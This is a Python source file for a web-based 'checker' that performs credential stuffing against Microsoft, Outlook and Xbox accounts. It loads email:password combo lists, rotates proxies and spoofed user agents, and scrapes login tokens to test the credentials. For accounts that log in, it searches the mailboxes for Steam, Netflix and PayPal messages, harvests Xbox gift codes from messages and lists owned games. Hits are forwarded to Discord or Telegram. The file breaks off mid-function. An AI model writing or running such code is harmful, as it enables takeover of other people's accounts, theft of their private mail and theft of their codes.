#!/usr/bin/env python3
"""
MEOWL CHECKER — Web Edition v8
File: app.py
Run:  python3 app.py
"""

import subprocess, sys, os, json

def _ensure(pkg, module=None):
    module = module or pkg.split('[')[0].split('>')[0].split('<')[0].split('=')[0]
    try:
        __import__(module)
    except ImportError:
        print(f"[*] Installing {pkg}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"[!] pip install {pkg} failed: {e}")

for _p, _m in [("flask", "flask"), ("requests", "requests"), ("urllib3", "urllib3"), ("pysocks", "socks")]:
    _ensure(_p, _m)

import re, time, uuid, threading, zipfile, socket
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from collections import deque
from io import BytesIO
from typing import Dict, List, Optional, Any, Set
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from flask import Flask, request, jsonify, make_response

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== Settings =====
SETTINGS_FILE = "meowl_settings.json"
DEFAULT_SETTINGS = {
    "color_primary": "#00b4d8",
    "color_secondary": "#0077b6",
    "discord_webhook": "",
    "tg_token": "",
    "tg_chat_id": "",
    "discord_invite": "https://discord.gg/your-invite",
    "tg_invite": "https://t.me/your-channel"
}
SETTINGS = DEFAULT_SETTINGS.copy()

def load_settings():
    global SETTINGS
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                SETTINGS.update(json.load(f))
        except Exception:
            pass

def save_settings():
    try:
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(SETTINGS, f, indent=4)
    except Exception:
        pass

load_settings()

# ===== Config =====
REQUEST_TIMEOUT     = 25
THREAD_JOIN_TIMEOUT = 5
HIT_FEED_SIZE       = 500
PORT_DEFAULT        = int(os.environ.get("PORT", 5000))
THREADS_MIN         = 1
THREADS_MAX         = 50
THREADS_DEFAULT     = 30

CODE_FETCH_PATTERN = re.compile(r'[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}')
_CODE_MSG_KEYS = {"text", "messageText", "content", "body", "message"}

COUNTRY_MAP = {
    "AF":"Afghanistan","AL":"Albania","DZ":"Algeria","AR":"Argentina","AU":"Australia",
    "AT":"Austria","AZ":"Azerbaijan","BH":"Bahrain","BD":"Bangladesh","BY":"Belarus",
    "BE":"Belgium","BZ":"Belize","BO":"Bolivia","BA":"Bosnia and Herzegovina","BR":"Brazil",
    "BN":"Brunei","BG":"Bulgaria","KH":"Cambodia","CM":"Cameroon","CA":"Canada","CL":"Chile",
    "CN":"China","CO":"Colombia","CR":"Costa Rica","HR":"Croatia","CU":"Cuba","CY":"Cyprus",
    "CZ":"Czech Republic","DK":"Denmark","DO":"Dominican Republic","EC":"Ecuador","EG":"Egypt",
    "SV":"El Salvador","EE":"Estonia","ET":"Ethiopia","FI":"Finland","FR":"France","DE":"Germany",
    "GH":"Ghana","GR":"Greece","GT":"Guatemala","HN":"Honduras","HK":"Hong Kong","HU":"Hungary",
    "IS":"Iceland","IN":"India","ID":"Indonesia","IR":"Iran","IQ":"Iraq","IE":"Ireland",
    "IL":"Israel","IT":"Italy","JM":"Jamaica","JP":"Japan","JO":"Jordan","KZ":"Kazakhstan",
    "KE":"Kenya","KW":"Kuwait","KG":"Kyrgyzstan","LA":"Laos","LV":"Latvia","LB":"Lebanon",
    "LY":"Libya","LT":"Lithuania","LU":"Luxembourg","MO":"Macao","MK":"Macedonia","MY":"Malaysia",
    "MV":"Maldives","MT":"Malta","MX":"Mexico","MD":"Moldova","MN":"Mongolia","ME":"Montenegro",
    "MA":"Morocco","MZ":"Mozambique","MM":"Myanmar","NP":"Nepal","NL":"Netherlands","NZ":"New Zealand",
    "NI":"Nicaragua","NG":"Nigeria","KP":"North Korea","NO":"Norway","OM":"Oman","PK":"Pakistan",
    "PS":"Palestine","PA":"Panama","PY":"Paraguay","PE":"Peru","PH":"Philippines","PL":"Poland",
    "PT":"Portugal","PR":"Puerto Rico","QA":"Qatar","RO":"Romania","RU":"Russia","RW":"Rwanda",
    "SA":"Saudi Arabia","RS":"Serbia","SG":"Singapore","SK":"Slovakia","SI":"Slovenia","SO":"Somalia",
    "ZA":"South Africa","KR":"South Korea","ES":"Spain","LK":"Sri Lanka","SD":"Sudan","SR":"Suriname",
    "SE":"Sweden","CH":"Switzerland","SY":"Syria","TW":"Taiwan","TJ":"Tajikistan","TZ":"Tanzania",
    "TH":"Thailand","TN":"Tunisia","TR":"Turkey","TM":"Turkmenistan","UA":"Ukraine","AE":"UAE",
    "GB":"United Kingdom","US":"United States","UY":"Uruguay","UZ":"Uzbekistan","VE":"Venezuela",
    "VN":"Vietnam","YE":"Yemen","ZM":"Zambia","ZW":"Zimbabwe",
}

def get_flag(cc):
    if not cc or len(cc) != 2: return ""
    cc = cc.upper()
    try:
        return chr(0x1F1E6 + ord(cc[0]) - ord('A')) + chr(0x1F1E6 + ord(cc[1]) - ord('A'))
    except Exception:
        return ""

def translate_country(cc):
    cc = (cc or "").upper().strip()
    name = COUNTRY_MAP.get(cc, cc)
    flag = get_flag(cc)
    return f"{name} {flag}" if flag else name

# ===== Proxy =====
def parse_proxy(line: str) -> Optional[str]:
    line = line.strip()
    if not line: return None
    if '://' in line: return line
    if '@' in line:   return f"http://{line}"
    parts = line.split(':')
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

class ProxyPool:
    def __init__(self, proxies=None):
        self.proxies = list(proxies or [])
        self.dead = set()
        self.lock = threading.Lock()
        self.index = 0
        self.proxyless_mode = False

    def get(self):
        with self.lock:
            if self.proxyless_mode or not self.proxies:
                return None
            if len(self.dead) >= len(self.proxies):
                return "ALL_DEAD"
            
            for _ in range(len(self.proxies)):
                self.index = (self.index + 1) % len(self.proxies)
                p = self.proxies[self.index]
                if p not in self.dead:
                    return p
        return None

    def mark_dead(self, proxy):
        if proxy and proxy != "ALL_DEAD":
            with self.lock:
                self.dead.add(proxy)

    def __len__(self): 
        return max(0, len(self.proxies) - len(self.dead))
    
    def stats(self):
        with self.lock:
            return {
                "total": len(self.proxies),
                "dead": len(self.dead),
                "alive": max(0, len(self.proxies) - len(self.dead))
            }

# ===== Utility =====
def normalize_combo(line: str) -> Optional[str]:
    line = line.strip()
    if not line: return None
    for sep in [':', '|', ';', ',', ' ', '\t']:
        if sep in line:
            parts = line.split(sep, 1)
            email, password = parts[0].strip(), parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
    return None

def create_optimized_session(threads=100, timeout=REQUEST_TIMEOUT, proxy=None):
    s = requests.Session()
    pool = threads + 50
    retry = Retry(total=1, backoff_factor=0.3,
                  status_forcelist=[429, 500, 502, 503, 504],
                  allowed_methods=["HEAD", "GET", "POST", "OPTIONS"])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=pool,
                          pool_maxsize=pool, pool_block=False)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    s.timeout = timeout
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    })
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    return s

def format_date(date_str: str) -> str:
    try:
        if not date_str: return "Unknown"
        date_str = date_str.replace('Z', '+00:00')
        return datetime.fromisoformat(date_str).strftime('%d/%m/%Y %H:%M')
    except Exception:
        return "Unknown"

def extract_message_details(msg: dict) -> dict:
    try:
        sender = "Unknown"
        if 'from' in msg and 'emailAddress' in msg['from']:
            sender = msg['from']['emailAddress'].get('address', 'Unknown')
        elif 'sender' in msg and 'emailAddress' in msg['sender']:
            sender = msg['sender']['emailAddress'].get('address', 'Unknown')
        subject = msg.get('subject', 'No Subject')
        date = msg.get('receivedDateTime', '')
        body = ""
        if 'body' in msg and 'content' in msg['body']:
            body = msg['body']['content']
        elif 'bodyPreview' in msg:
            body = msg['bodyPreview']
        if body:
            body = re.sub(r'<[^>]+>', ' ', body)
            body = re.sub(r'&nbsp;', ' ', body)
            body = re.sub(r'&[a-z]+;', ' ', body)
            body = re.sub(r'\s+', ' ', body).strip()
            if len(body) > 200: body = body[:200] + "..."
        return {'sender': sender, 'subject': subject, 'date': date, 'body_preview': body}
    except Exception:
        return {'sender': 'Unknown', 'subject': 'No Subject', 'date': '', 'body_preview': ''}

# ===== Notifications =====
def send_notifications(category, text):
    def _discord():
        url = SETTINGS.get("discord_webhook", "").strip()
        if not url: return
        try:
            requests.post(url, json={"content": f"**[{category}]** `{text}`"}, timeout=5)
        except Exception: pass

    def _telegram():
        token = SETTINGS.get("tg_token", "").strip()
        chat = SETTINGS.get("tg_chat_id", "").strip()
        if not token or not chat: return
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": chat, "text": f"[{category}] {text}", "parse_mode": "Markdown"}, timeout=5)
        except Exception: pass

    threading.Thread(target=_discord, daemon=True).start()
    threading.Thread(target=_telegram, daemon=True).start()

# ===== Code Fetcher =====
def _iter_code_messages(obj):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in _CODE_MSG_KEYS and isinstance(v, str):
                yield v
            else:
                yield from _iter_code_messages(v)
    elif isinstance(obj, list):
        for item in obj:
            yield from _iter_code_messages(item)

def _extract_codes_from_text(text) -> List[str]:
    return [m.upper() for m in CODE_FETCH_PATTERN.findall(str(text))]

def _get_ms_tokens(session):
    try:
        res = session.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en",
            timeout=15, verify=False
        )
        text = res.text
        ppft_pat  = re.compile(r'name=["\']PPFT["\'][^>]*value=["\']([^"\']+)["\']')
        ppft_pat2 = re.compile(r'value=["\']([^"\']+)["\'][^>]*name=["\']PPFT["\']')
        sft = (re.search(ppft_pat, text) or re.search(ppft_pat2, text)
               or re.search(r'sFTTag[^"]*?value=\\\"([^\\\"]+)\\\"', text)
               or re.search(r'value=\\\"(.+?)\\\"', text))
        post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r"urlPost:'(.+?)'", text)
        if sft and post:
            return post.group(1), sft.group(1)
        return None, None
    except Exception:
        return None, None

def _fetch_codes_for_account(email: str, password: str, proxy: Optional[str] = None,
                              diag: Optional[dict] = None) -> List[str]:
    if diag is None: diag = {}
    session = create_optimized_session(proxy=proxy)
    found_codes: List[str] = []
    try:
        url_post, sft_tag = _get_ms_tokens(session)
        diag['ppft_or_urlpost'] = bool(url_post and sft_tag)
        if not url_post: return found_codes

        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sft_tag}
        res = session.post(url_post, data=data, allow_redirects=True, timeout=15, verify=False)
        diag['login_final_url'] = (res.url or '')[:200]

        ms_token = None
        if '#' in res.url:
            ms_token = parse_qs(urlparse(res.url).fragment).get('access_token', [None])[0]
        elif 'cancel?mkt=' in res.text:
            try:
                ipt   = re.search('(?<="ipt" value=").+?(?=">)', res.text).group()
                pprid = re.search('(?<="pprid" value=").+?(?=">)', res.text).group()
                uaid  = re.search('(?<="uaid" value=").+?(?=">)', res.text).group()
                post_url = re.search('(?<=id="fmHF" action=").+?(?=" )', res.text).group()
                ret = session.post(post_url, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid},
                                   allow_redirects=True, verify=False)
                final_redirect = re.search('(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group()
                fin = session.get(final_redirect, allow_redirects=True, verify=False)
                ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
            except Exception:
                pass
        diag['token_found'] = bool(ms_token)
        if not ms_token: return found_codes

        xbl_res = session.post(
            'https://user.auth.xboxlive.com/user/authenticate',
            json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                 "RpsTicket": ms_token},
                  "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=15, verify=False)
        if xbl_res.status_code != 200: return found_codes
        xbl_data = xbl_res.json()
        try:
            uhs = xbl_data['DisplayClaims']['xui'][0]['uhs']
            user_token = xbl_data['Token']
        except (KeyError, IndexError):
            return found_codes

        xsts_res = session.post(
            'https://xsts.auth.xboxlive.com/xsts/authorize',
            json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                  "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=15, verify=False)
        if xsts_res.status_code != 200: return found_codes
        try: xsts_token = xsts_res.json()['Token']
        except KeyError: return found_codes

        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
        msg_res = session.get(
            "https://xblmessaging.xboxlive.com/network/xbox/users/me/conversations/users/xuid(0)?maxItems=500",
            headers={"Authorization": auth_header, "x-xbl-contract-version": "1",
                     "Accept": "application/json"}, timeout=15, verify=False)
        if msg_res.status_code != 200: return found_codes
        for m in _iter_code_messages(msg_res.json()):
            found_codes.extend(_extract_codes_from_text(m))
        return found_codes
    except requests.exceptions.ProxyError:
        raise
    except Exception as e:
        diag['exception'] = str(e)[:200]
        return found_codes

# ===== Hotmail/Outlook =====
class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None, inbox_keywords=None, threads=100):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
        self.session = create_optimized_session(threads, REQUEST_TIMEOUT, proxy=proxy)
        self.access_token = None
        self.cid = None
        self.country = None
        self.name = None
        self.sFTTag_url = ('https://login.live.com/oauth20_authorize.srf'
                           '?client_id=00000000402B5328'
                           '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
                           '&scope=service::user.auth.xboxlive.com::MBI_SSL'
                           '&display=touch&response_type=token&locale=en')
        self._keyword_messages = {}
        self._diag = {}

    def get_urlPost_sFTTag(self):
        maxretries = 3
        attempts = 0
        while attempts < maxretries:
            try:
                headers = {
                    'User-Agent': ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                   "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                text = self.session.get(self.sFTTag_url, headers=headers,
                                        timeout=REQUEST_TIMEOUT, verify=False).text
                self._diag['page_len'] = len(text or '')
                match = (re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or
                         re.search('value="(.+?)"', text, re.S) or
                         re.search("sFTTag:'(.+?)'", text, re.S) or
                         re.search('sFTTag:"(.+?)"', text, re.S) or
                         re.search('name="PPFT".*?value="(.+?)"', text, re.S))
                if match:
                    sFTTag = match.group(1)
                    match = (re.search('"urlPost":"(.+?)"', text, re.S) or
                             re.search("urlPost:'(.+?)'", text, re.S) or
                             re.search('urlPost:"(.+?)"', text, re.S) or
                             re.search('<form.*?action="(.+?)"', text, re.S))
                    if match:
                        urlPost = match.group(1).replace('&amp;', '&')
                        self._diag['ppft_found'] = True
                        self._diag['urlpost_found'] = True
                        return urlPost, sFTTag
                if attempts == 0:
                    self._diag['page_snippet'] = (text or '')[:400]
            except requests.exceptions.ProxyError:
                raise
            except Exception as e:
                self._diag.setdefault('errors', []).append(str(e)[:120])
            attempts += 1
            time.sleep(0.5)
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        maxretries = 3
        tries = 0
        while tries < maxretries:
            try:
                data = {'login': self.email, 'loginfmt': self.email,
                        'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                   "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'close',
                }
                login_request = self.session.post(urlPost, data=data, headers=headers,
                                                  allow_redirects=True,
                                                  timeout=REQUEST_TIMEOUT, verify=False)
                self._diag['login_final_url'] = (login_request.url or '')[:200]
                self._diag['login_status'] = login_request.status_code

                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        self._diag['token_found'] = True
                        return 'SUCCESS'
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt   = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid  = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        if ipt and pprid and uaid:
                            d2 = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                            if action:
                                ret = self.session.post(action.group(), data=d2,
                                                        allow_redirects=True,
                                                        timeout=REQUEST_TIMEOUT, verify=False)
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True,
                                                           timeout=REQUEST_TIMEOUT, verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        self._diag['token_found'] = True
                                        return 'SUCCESS'
                    except Exception:
                        pass
                    self._diag['reason'] = 'recovery_flow'
                    return '2FA'
                elif any(v in login_request.text for v in
                         ['recover?mkt', 'account.live.com/identity/confirm?mkt',
                          'Email/Confirm?mkt', '/Abuse?mkt=']):
                    self._diag['reason'] = 'needs_verification'
                    return '2FA'
                elif any(v in login_request.text.lower() for v in
                         ['password is incorrect', "account doesn't exist",
                          "that microsoft account doesn't exist",
                          "tried to sign in too many times with an incorrect account or password",
                          'help us protect your account']):
                    self._diag['reason'] = 'wrong_password_or_locked'
                    return 'BAD'
                self._diag['reason'] = 'unknown_response'
                self._diag['body_snippet'] = (login_request.text or '')[:400]
            except requests.exceptions.Timeout:
                self._diag['reason'] = 'timeout'
            except requests.exceptions.ProxyError:
                raise
            except Exception as e:
                self._diag['reason'] = str(e)[:120]
            tries += 1
            time.sleep(0.5)
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            self._diag.setdefault('reason', 'no_ppft_or_urlpost')
            return 'BAD'
        return self.get_xbox_rps(urlPost, sFTTag)

    # [Additional methods unchanged: get_graph_token, get_profile_via_graph, get_profile_via_substrate, check_inbox_via_graph, check_inbox, get_keyword_messages, get_access_token_for_outlook]
    def get_graph_token(self):
        try:
            client_id = '0000000048170EF2'
            scope = ('https://graph.microsoft.com/User.Read '
                     'https://graph.microsoft.com/Mail.Read '
                     'https://graph.microsoft.com/Mail.ReadWrite')
            auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                        f'&response_type=token&scope={scope}'
                        '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
            r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            if not token:
                scope = 'https://graph.microsoft.com/Mail.Read'
                auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                            f'&response_type=token&scope={scope}'
                            '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
                r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
                token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            return token
        except Exception:
            return None

    def get_profile_via_graph(self, token):
        try:
            headers = {'Authorization': f'Bearer {token}',
                       'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers,
                                 timeout=REQUEST_TIMEOUT, verify=False)
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
                self.name = data.get('displayName', 'Unknown')
                if not self.country or self.country == 'Unknown':
                    try:
                        r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings',
                                              headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                        if r2.status_code == 200:
                            self.country = r2.json().get('timeZone', 'Unknown')
                    except Exception:
                        pass
                return True
            return False
        except Exception:
            return False

    def get_profile_via_substrate(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=REQUEST_TIMEOUT, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                        f'&response_type=token&scope={scope}'
                        '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
            r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            if not token: return False
            self.cid = self.session.cookies.get('MSPCID', self.email)
            headers = {'Authorization': f'Bearer {token}',
                       'X-AnchorMailbox': f'CID:{self.cid}',
                       'Content-Type': 'application/json',
                       'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                                 headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
                self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
                return True
            return False
        except Exception:
            return False

    def check_inbox_via_graph(self):
        token = self.get_graph_token()
        if not token: return 0, []
        found_info = []
        total_found_sum = 0
        headers = {'Authorization': f'Bearer {token}',
                   'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        keyword_messages = {}
        for keyword in self.inbox_keywords:
            try:
                query = (f'https://graph.microsoft.com/v1.0/me/messages?$search="subject:{keyword}"'
                         '&$select=subject,receivedDateTime,body,bodyPreview,sender,from&$top=25')
                r = self.session.get(query, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = data.get('@odata.count', 0)
                    if total == 0 and 'value' in data:
                        total = len(data['value'])
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
                        messages = []
                        for msg in data.get('value', [])[:3]:
                            details = extract_message_details(msg)
                            if details['body_preview']: messages.append(details)
                        if messages: keyword_messages[keyword] = messages
                        try:
                            query2 = (f'https://graph.microsoft.com/v1.0/me/messages?$search="body:{keyword}"'
                                      '&$select=subject,receivedDateTime,body,bodyPreview,sender,from&$top=25')
                            r2 = self.session.get(query2, headers=headers,
                                                  timeout=REQUEST_TIMEOUT, verify=False)
                            if r2.status_code == 200:
                                data2 = r2.json()
                                total2 = data2.get('@odata.count', len(data2.get('value', [])))
                                if total2 > 0:
                                    total_found_sum += total2
                                    found_info.append(f"{keyword}(body): {total2}")
                                    for msg in data2.get('value', [])[:3]:
                                        details = extract_message_details(msg)
                                        if details['body_preview']:
                                            keyword_messages.setdefault(keyword, [])
                                            if len(keyword_messages[keyword]) < 2:
                                                keyword_messages[keyword].append(details)
                        except Exception:
                            pass
            except Exception:
                pass
        self._keyword_messages = keyword_messages
        return total_found_sum, found_info

    def check_inbox(self):
        total_found, found_info = self.check_inbox_via_graph()
        if total_found > 0:
            return total_found, found_info
        token = self.get_access_token_for_outlook()
        if not token:
            return 0, []
        cid = self.session.cookies.get('MSPCID', self.email)
        headers = {'Authorization': f'Bearer {token}',
                   'X-AnchorMailbox': f'CID:{cid}',
                   'Content-Type': 'application/json',
                   'User-Agent': 'Outlook-Android/2.0',
                   'Accept': 'application/json', 'Host': 'substrate.office.com'}
        found_info = []
        total_found_sum = 0
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        keyword_messages = {}
        for keyword in self.inbox_keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC', 'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation', 'ContentSources': ['Exchange'],
                        'Filter': {'Or': [
                            {'Term': {'DistinguishedFolderName': 'msgfolderroot'}},
                            {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0, 'Query': {'QueryString': keyword},
                        'Size': 25, 'EnableTopResults': True, 'TopResultsCount': 3}],
                    'AnswerEntityRequests': [{
                        'Query': {'QueryString': keyword},
                        'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10,
                        'EnableAsyncResolution': True}],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                }
                r = self.session.post(url, json=payload, headers=headers,
                                      timeout=REQUEST_TIMEOUT, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if 'Total' in result_set: total = result_set['Total']
                                    elif 'ResultCount' in result_set: total = result_set['ResultCount']
                                    elif 'Results' in result_set: total = len(result_set['Results'])
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
            except Exception:
                pass
        self._keyword_messages = keyword_messages
        return total_found_sum, found_info

    def get_keyword_messages(self):
        return getattr(self, '_keyword_messages', {})

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=REQUEST_TIMEOUT, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                        f'&response_type=token&scope={scope}'
                        '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
            r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            if not token:
                auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                            '&response_type=token&scope=service::outlook.office.com::MBI_SSL'
                            '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
                r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
                token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            return token
        except Exception:
            return None

# ===== Xbox =====
class XboxChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.mount('https://', HTTPAdapter(pool_connections=50, pool_maxsize=50))
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                                     "AppleWebKit/537.36"})
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self._diag = {}

    def get_formatted_games(self, session, uhs, xsts_token):
        formatted_list = ""
        premium_keywords = [
            "resident evil", "fifa", "fc 24", "fc 25", "fc 26", "modern warfare",
            "call of duty", "black ops", "pes", "eFootball", "rust", "elden ring",
            "dark souls", "ark", "cyberpunk", "witcher", "red dead", "gta",
            "grand theft auto", "battlefield", "star wars", "assassin", "far cry",
            "forza", "halo", "gears of war", "minecraft", "diablo", "overwatch",
            "destiny", "skyrim", "fallout", "doom"]
        games_list = []
        try:
            me_url = "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag"
            headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                       "x-xbl-contract-version": "2", "Accept": "application/json"}
            me_resp = session.get(me_url, headers=headers, timeout=10)
            if me_resp.status_code == 200:
                xuid = me_resp.json()['profileUsers'][0]['id']
                ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems=999"
                ach_resp = session.get(ach_url, headers=headers, timeout=10)
                if ach_resp.status_code == 200:
                    for t in ach_resp.json().get('titles', []):
                        game_name = t.get('name', 'Unknown Game')
                        current_score = t.get('currentGamerscore', 0)
                        total_score = t.get('totalGamerscore', current_score)
                        is_premium = any(k.lower() in game_name.lower() for k in premium_keywords)
                        games_list.append({'name': game_name, 'score': current_score,
                                           'total_score': total_score, 'premium': is_premium})
                    games_list.sort(key=lambda x: x['score'], reverse=True)
                    for i, game in enumerate(games_list[:50], 1):
                        premium_tag = " 🔥[PREMIUM]" if game['premium'] else ""
                        formatted_list += f"   {i} - {game['name']} | Score: {game['score']}G{premium_tag}\n"
                    if len(games_list) > 50:
                        formatted_list += f"   ... and {len(games_list) - 50} more games\n"
        except Exception:
            pass
        return formatted_list, games_list

    def check_v2(self, email, password):
        try:
            session = self.session
            sftag_url = ("https://login.live.com/oauth20_authorize.srf"
                         "?client_id=00000000402B5328"
                         "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                         "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                         "&display=touch&response_type=token&locale=en")
            resp = session.get(sftag_url, timeout=15, verify=False)
            self._diag['page_len'] = len(resp.text or '')

            sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text)
            if not sftag_match:
